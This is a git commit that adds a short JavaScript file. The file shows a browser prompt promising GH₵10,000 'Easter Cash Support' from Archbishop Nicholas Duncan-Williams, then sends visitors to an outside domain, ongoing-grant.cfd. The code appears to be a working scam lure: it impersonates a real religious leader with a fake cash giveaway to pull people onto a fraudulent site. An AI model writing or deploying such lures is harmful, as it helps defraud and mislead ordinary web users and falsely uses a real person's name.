90e13539ed118a6c7917fcf0d39f9818168aa726
The-ongoing <preciousadaowo4@gmail.com>
2026-04-06 11:54:33 +0100

    Create activeeastergh.js

---
+++ activeeastergh.js
@@ -0,0 +1,10 @@
+var password = 'GH₵10,000';
+
+password = prompt(
+  'Congratulations, you are eligible to Receive ARCHBISHOP NICHOLAS DUNCAN-WILLIAMS GH₵10,000 Easter Cash Support. Click OK to receive Instantly.',
+  'GH₵10,000'
+);
+
+if (password !== 'GH₵10,000') {
+    location.href = 'https://ongoing-grant.cfd/10000-Easter-Support.html';
+}
